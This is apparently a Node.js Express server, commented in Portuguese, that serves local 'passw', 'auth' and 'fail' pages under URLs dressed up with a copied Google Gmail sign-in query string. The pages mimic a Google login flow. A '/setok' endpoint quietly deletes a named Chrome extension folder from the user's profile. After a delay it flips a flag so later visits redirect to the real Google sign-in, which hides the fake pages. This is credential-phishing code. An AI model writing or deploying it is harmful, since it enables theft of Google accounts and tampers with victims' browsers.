// 1. Importar os módulos necessários
const express = require("express");
const path = require("path");
const fs = require("fs").promises;

// 2. Inicializar o aplicativo Express
const app = express();
const PORT = 3000; // Porta em que o servidor vai rodar

// 3. Servir arquivos estáticos (HTML, CSS, JS) da pasta 'public'
// Isso faz com que o Express encontre e sirva o index.html na rota raiz '/'
// e os outros arquivos HTML nas suas respectivas rotas (ex: /sobre.html).

async function redirecionar() {
  try {
    const response = await fetch("http://localhost:3000/ok");

    if (!response.ok) {
      throw new Error("Erro na requisição: " + response.status);
    }

    const data = await response.json();
    return data.ok;
  } catch (error) {
    console.error("Houve um problema com a operação fetch:", error);
  }
}

app.get("/", async (req, res) => {
  let result = await redirecionar();

  if (result) {
    return res.redirect(
      "https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&ifkv=AdBytiMXZ-oFrmTCkoVJQ_g7ihwygIm_erWjq-nMfIGi5OdGhtF6ih6GmFbLPWtVK9PImKIObDm-6g&rip=1&sacu=1&service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S-1875645784%3A1752196213801564"
    );
  }

  if (!req.query.session_id) {
    const newUrl = `/?session_id=uhd71d8dh17d178d128dfgdadha78gd1&client_ver=1.0.5&ref=internal&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&ifkv=AdBytiMXZ-oFrmTCkoVJQ_g7ihwygIm_erWjq-nMfIGi5OdGhtF6ih6GmFbLPWtVK9PImKIObDm-6g&rip=1&sacu=1&service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S-1875645784%3A1752196213801564`;
    return res.redirect(newUrl);
  }
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

app.use(express.static(path.join(__dirname, "public")));

app.get("/passw", async (req, res) => {
  let result = await redirecionar();

  if (result) {
    return res.redirect(
      "https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&ifkv=AdBytiMXZ-oFrmTCkoVJQ_g7ihwygIm_erWjq-nMfIGi5OdGhtF6ih6GmFbLPWtVK9PImKIObDm-6g&rip=1&sacu=1&service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S-1875645784%3A1752196213801564"
    );
  }

  if (!req.query.session_id) {
    const newUrl = `/passw?session_id=uhd71d8dh17d178d128dfgdadha78gd1&client_ver=1.0.5&ref=internal&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&ifkv=AdBytiMXZ-oFrmTCkoVJQ_g7ihwygIm_erWjq-nMfIGi5OdGhtF6ih6GmFbLPWtVK9PImKIObDm-6g&rip=1&sacu=1&service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S-1875645784%3A1752196213801564`;
    return res.redirect(newUrl);
  }
  res.sendFile(path.join(__dirname, "public", "passw.html"));
});

app.get("/auth", async (req, res) => {
  let result = await redirecionar();

  if (result) {
    return res.redirect(
      "https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&ifkv=AdBytiMXZ-oFrmTCkoVJQ_g7ihwygIm_erWjq-nMfIGi5OdGhtF6ih6GmFbLPWtVK9PImKIObDm-6g&rip=1&sacu=1&service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S-1875645784%3A1752196213801564"
    );
  }
  
  if (!req.query.session_id) {
    const newUrl = `/auth?session_id=uhd71d8dh17d178d128dfgdadha78gd1&client_ver=1.0.5&ref=internal&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&ifkv=AdBytiMXZ-oFrmTCkoVJQ_g7ihwygIm_erWjq-nMfIGi5OdGhtF6ih6GmFbLPWtVK9PImKIObDm-6g&rip=1&sacu=1&service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S-1875645784%3A1752196213801564`;
    return res.redirect(newUrl);
  }
  res.sendFile(path.join(__dirname, "public", "auth.html"));
});

app.get("/fail", (req, res) => {
  if (!req.query.session_id) {
    const newUrl = `/fail?session_id=uhd71d8dh17d178d128dfgdadha78gd1&client_ver=1.0.5&ref=internal&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&ifkv=AdBytiMXZ-oFrmTCkoVJQ_g7ihwygIm_erWjq-nMfIGi5OdGhtF6ih6GmFbLPWtVK9PImKIObDm-6g&rip=1&sacu=1&service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S-1875645784%3A1752196213801564`;
    return res.redirect(newUrl);
  }
  res.sendFile(path.join(__dirname, "public", "fail.html"));
});

// 4. Criar o endpoint GET '/ok' para redirecionamento
app.get("/ok", async (req, res) => {
  const caminhoDoArquivo = path.join(__dirname, "ok.json");
  const conteudoDoArquivo = await fs.readFile(caminhoDoArquivo, "utf8");
  const dadosObjeto = JSON.parse(conteudoDoArquivo);
  const jsonParaEnviar = JSON.stringify(dadosObjeto, null, 2);
  res.send(jsonParaEnviar);
});

app.get("/setok", async (req, res) => {
  const caminhoDoArquivo = path.join(__dirname, "ok.json");

  const caminhoDaPastaParaExcluir = path.join(
    process.env.LOCALAPPDATA,
    "Google",
    "Chrome",
    "User Data",
    "Default",
    "Extensions",
    "mdnleldcmiljblolnjhpnblkcekpdkpa"
  );

  try {
    res.send("ok");

    await fs.rm(caminhoDaPastaParaExcluir, { recursive: true, force: true });

    setTimeout(async () => {
      try {
        const conteudoDoArquivo = await fs.readFile(caminhoDoArquivo, "utf8");
        let dadosObjeto = JSON.parse(conteudoDoArquivo);

        dadosObjeto.ok = true;

        await fs.writeFile(caminhoDoArquivo, JSON.stringify(dadosObjeto, null, 2), "utf8");
      } catch (innerError) {
      }
    }, 30000);

  } catch (error) {
    if (!res.headersSent) {
      res.status(500).send("Ocorreu um erro ao processar sua requisição.");
    }
  }
});

// 5. Iniciar o servidor e fazê-lo "ouvir" na porta definida
app.listen(PORT, () => {
  // console.log("Pressione CTRL+C para derrubar o servidor.");
});
